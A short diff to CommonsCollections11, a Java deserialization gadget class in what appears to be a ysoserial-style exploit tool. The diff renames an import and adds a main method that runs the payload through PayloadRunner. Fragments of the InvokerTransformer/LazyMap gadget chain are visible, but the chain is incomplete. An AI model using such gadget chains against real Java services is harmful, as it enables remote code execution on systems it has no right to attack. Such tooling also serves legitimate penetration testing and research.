@@ -1,11 +1,12 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 import A.R.ysogate.payloads.ObjectPayload;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import javax.management.remote.JMXServiceURL;
 import javax.management.remote.rmi.RMIConnector;
@@ -41,5 +42,9 @@ public class CommonsCollections11 implements ObjectPayload<Object> {
 		Reflections.setFieldValue(lazyMap, "factory", invokerTransformer);
 
 		return expMap;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsCollections11.class, args);
 	}
 }
